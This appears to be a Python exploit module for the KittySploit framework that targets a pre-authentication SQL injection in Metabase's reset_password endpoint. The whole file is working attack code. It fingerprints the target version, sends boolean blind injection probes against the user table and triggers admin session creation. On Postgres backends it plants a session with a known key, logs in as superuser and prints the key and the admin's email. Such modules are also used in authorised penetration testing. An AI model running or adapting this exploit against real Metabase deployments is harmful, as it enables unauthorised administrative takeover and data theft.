#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""GHSA-vwf4-m7j8-wcjf — Metabase pre-auth SQLi / admin session hijack.

Affected: Metabase >= v0.58.0 (OSS + Enterprise, Cloud + Self-hosted)
Fixed in: v0.58.24, v0.59.21, v0.60.17, v0.61.11, v0.62.9, v0.63.5
CVSS: 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

Demonstrates:
  1. Arbitrary SQL injection via HoneySQL raw-map in the user-id body key
  2. Admin session creation as a side-effect of the login! pipeline
  3. On Postgres backends: full data extraction + session hijack via INSERT RETURNING
"""

import hashlib
import uuid

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


_FIXED_MINOR = {58: 24, 59: 21, 60: 17, 61: 11, 62: 9, 63: 5}


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Metabase reset_password SQLi Admin Takeover (GHSA-vwf4-m7j8-wcjf)",
        "description": (
            "GHSA-vwf4-m7j8-wcjf in Metabase >= v0.58.0 before the x.58.24 / x.59.21 / "
            "x.60.17 / x.61.11 / x.62.9 / x.63.5 patches: pre-authentication SQL injection "
            "in POST /api/session/reset_password via HoneySQL raw-map in the user-id JSON "
            "key. On all backends, injecting a subquery that resolves to the admin user ID "
            "creates an admin session as a side-effect (HTTP 400 is expected). On Postgres "
            "application databases, INSERT ... RETURNING plants a session with a known key "
            "for immediate authentication as superuser."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf",
        ],
        "tags": [
            "metabase",
            "sqli",
            "unauthenticated",
            "auth-bypass",
            "account-takeover",
            "ghsa-vwf4-m7j8-wcjf",
            "auxiliary",
        ],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["metabase"],
                "endpoint_pattern_any": ["/api/session/reset_password"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "reset_password user-id raw-map"},
                    {"capability": "auth_bypass", "from_detail": "admin session side-effect"},
                    {"capability": "admin_access", "from_detail": "Postgres session hijack"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(3000, "Metabase HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    postgres = OptBool(
        False,
        "Attempt Postgres-only session hijack via INSERT ... RETURNING",
        False,
    )
    password = OptString(
        "Kittysploit_Poc_9!",
        "Password sent in the reset_password body (required by the endpoint)",
        False,
        advanced=True,
    )
    skip_version_check = OptBool(
        False,
        "Skip version range validation",
        False,
        advanced=True,
    )

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _parse_version_tag(tag: str):
        parts = str(tag or "").lstrip("v").split(".")
        if len(parts) < 2:
            return None, None
        try:
            major = int(parts[1]) if len(parts) >= 3 else int(parts[0])
            minor = int(parts[2]) if len(parts) >= 3 else 0
        except (ValueError, IndexError):
            return None, None
        return major, minor

    @classmethod
    def _version_is_vulnerable(cls, tag: str) -> bool:
        major, minor = cls._parse_version_tag(tag)
        if major is None or major < 58:
            return False
        fixed = _FIXED_MINOR.get(major)
        if fixed is not None and minor >= fixed:
            return False
        return True

    def _fetch_version(self):
        response = self.http_request(
            method="GET",
            path=self._api("/api/session/properties"),
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )
        if not response or response.status_code != 200:
            return None, f"session/properties HTTP {getattr(response, 'status_code', '?')}"
        body, err = parse_json_response(response)
        if err or not body:
            return None, err or "invalid JSON from session/properties"
        tag = (body.get("version") or {}).get("tag", "")
        if not tag:
            return None, "no version tag in session/properties"
        return tag, None

    def _inject_sql(self, raw_sql: str):
        payload = {
            "token": "1_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            "password": str(self.password or "Kittysploit_Poc_9!"),
            "user-id": {"raw": raw_sql},
        }
        return self.http_request(
            method="POST",
            path=self._api("/api/session/reset_password"),
            json=payload,
            headers={"Content-Type": "application/json"},
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )

    def _current_user(self, session_key: str):
        return self.http_request(
            method="GET",
            path=self._api("/api/user/current"),
            headers={"X-Metabase-Session": session_key},
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )

    def check(self):
        version, err = self._fetch_version()
        if not version:
            return {"vulnerable": False, "reason": err or "Metabase not detected", "confidence": "low"}

        if not self.skip_version_check and not self._version_is_vulnerable(version):
            return {
                "vulnerable": False,
                "reason": f"Metabase {version} is outside the vulnerable range or patched",
                "confidence": "high",
                "version": version,
            }

        true_sql = (
            "CASEWHEN(1=1, (SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE), 99999)"
        )
        false_sql = (
            "CASEWHEN(1=0, (SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE), 99999)"
        )

        true_resp = self._inject_sql(true_sql)
        false_resp = self._inject_sql(false_sql)

        if not true_resp or not false_resp:
            return {
                "vulnerable": False,
                "reason": "no response from reset_password injection",
                "confidence": "medium",
                "version": version,
            }

        if true_resp.status_code != 400 or false_resp.status_code != 400:
            return {
                "vulnerable": False,
                "reason": (
                    f"reset_password did not return expected HTTP 400 "
                    f"(got {true_resp.status_code}/{false_resp.status_code})"
                ),
                "confidence": "high",
                "version": version,
            }

        true_body = (true_resp.text or "").strip()
        false_body = (false_resp.text or "").strip()
        sqli_confirmed = true_body != false_body

        result = {
            "vulnerable": True,
            "reason": (
                f"Metabase {version} accepts user-id HoneySQL raw-map on reset_password"
                + ("; boolean SQLi confirmed" if sqli_confirmed else "")
            ),
            "confidence": "high" if sqli_confirmed else "medium",
            "version": version,
            "sqli_confirmed": sqli_confirmed,
        }

        if self.postgres:
            known_key = str(uuid.uuid4())
            known_hash = hashlib.sha512(known_key.encode("ascii")).hexdigest()
            known_id = "".join(c for c in str(uuid.uuid4()) if c != "-")[:12]
            sql = (
                f"(SELECT id FROM "
                f"(INSERT INTO core_session (id, user_id, created_at, key_hashed) "
                f"VALUES ('{known_id}', "
                f"(SELECT MIN(id) FROM core_user WHERE is_superuser = true), "
                f"now(), "
                f"'{known_hash}') "
                f"RETURNING id) t)"
            )
            hijack_resp = self._inject_sql(sql)
            if not hijack_resp:
                result["postgres_hijack"] = False
                result["postgres_reason"] = "no injection response"
                return result

            auth_resp = self._current_user(known_key)
            if auth_resp and auth_resp.status_code == 200:
                user, user_err = parse_json_response(auth_resp)
                if user and not user_err:
                    result["postgres_hijack"] = True
                    result["session_key"] = known_key
                    result["admin_email"] = user.get("email")
                    result["admin_id"] = user.get("id")
                    result["is_superuser"] = user.get("is_superuser")
                    result["reason"] = (
                        f"Postgres session hijack succeeded as {user.get('email')} "
                        f"(superuser={user.get('is_superuser')})"
                    )
                    result["confidence"] = "high"
                    return result

            result["postgres_hijack"] = False
            result["postgres_reason"] = (
                f"session key rejected (HTTP {getattr(auth_resp, 'status_code', '?')}) — "
                "likely non-Postgres application database"
            )

        return result

    def run(self):
        try:
            print_status("GHSA-vwf4-m7j8-wcjf — Metabase reset_password SQLi")

            version, err = self._fetch_version()
            if version:
                print_info(f"Target version: {version}")
                if not self.skip_version_check and not self._version_is_vulnerable(version):
                    print_error(f"Version {version} is not in the vulnerable range (or patched)")
                    return False
            elif err:
                print_warning(f"Version check failed: {err}")

            print_status("[1] SQL injection — admin session side-effect")
            admin_sql = "(SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE)"
            resp = self._inject_sql(admin_sql)
            if not resp:
                print_error("No response from reset_password injection")
                return False

            print_info(f"POST reset_password: HTTP {resp.status_code} body={(resp.text or '').strip()[:200]}")
            if resp.status_code == 400:
                print_success(
                    "HTTP 400 expected — handler rejects bad token, but admin session "
                    "may be created as a DB side-effect (key not returned in response)"
                )
            else:
                print_warning(f"Unexpected HTTP {resp.status_code}")

            print_status("[2] Boolean-based blind SQL injection")
            probes = (
                (
                    "TRUE condition (resolves admin)",
                    "CASEWHEN(1=1, (SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE), 99999)",
                ),
                (
                    "FALSE condition (resolves nobody)",
                    "CASEWHEN(1=0, (SELECT MIN(ID) FROM CORE_USER WHERE IS_SUPERUSER = TRUE), 99999)",
                ),
            )
            for label, sql in probes:
                probe_resp = self._inject_sql(sql)
                code = getattr(probe_resp, "status_code", "?")
                body = (probe_resp.text or "").strip()[:200] if probe_resp else ""
                print_info(f"{label}: HTTP {code} body={body}")

            if not self.postgres:
                print_info("Set postgres=true for Postgres session hijack (full admin takeover)")
                check = self.check()
                if check.get("vulnerable"):
                    print_success(check.get("reason", "Target appears vulnerable"))
                    return True
                print_error(check.get("reason", "Target does not appear vulnerable"))
                return False

            print_status("[3] Postgres session hijack via INSERT ... RETURNING")
            known_key = str(uuid.uuid4())
            known_hash = hashlib.sha512(known_key.encode("ascii")).hexdigest()
            known_id = "".join(c for c in str(uuid.uuid4()) if c != "-")[:12]

            print_info(f"Planting session id={known_id} key={known_key}")
            print_info(f"sha512(key)={known_hash[:40]}...")

            sql = (
                f"(SELECT id FROM "
                f"(INSERT INTO core_session (id, user_id, created_at, key_hashed) "
                f"VALUES ('{known_id}', "
                f"(SELECT MIN(id) FROM core_user WHERE is_superuser = true), "
                f"now(), "
                f"'{known_hash}') "
                f"RETURNING id) t)"
            )
            hijack_resp = self._inject_sql(sql)
            if not hijack_resp:
                print_error("No response from Postgres hijack injection")
                return False
            print_info(f"Injection: HTTP {hijack_resp.status_code}")

            print_status("Authenticating with planted session key...")
            auth_resp = self._current_user(known_key)
            if not auth_resp:
                print_error("No response from /api/user/current")
                return False

            print_info(f"GET /api/user/current: HTTP {auth_resp.status_code}")
            if auth_resp.status_code != 200:
                print_error(
                    f"Authentication failed — likely non-Postgres backend "
                    f"(body={(auth_resp.text or '')[:200]})"
                )
                return False

            user, user_err = parse_json_response(auth_resp)
            if user_err or not user:
                print_error(f"Could not parse authenticated user: {user_err}")
                return False

            email = user.get("email", "")
            user_id = user.get("id")
            superuser = user.get("is_superuser")
            print_success(
                f"Authenticated as {email} (id={user_id}, superuser={superuser})"
            )
            print_success(f"Session key: {known_key}")
            print_success("Full admin takeover confirmed (Postgres backend)")
            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
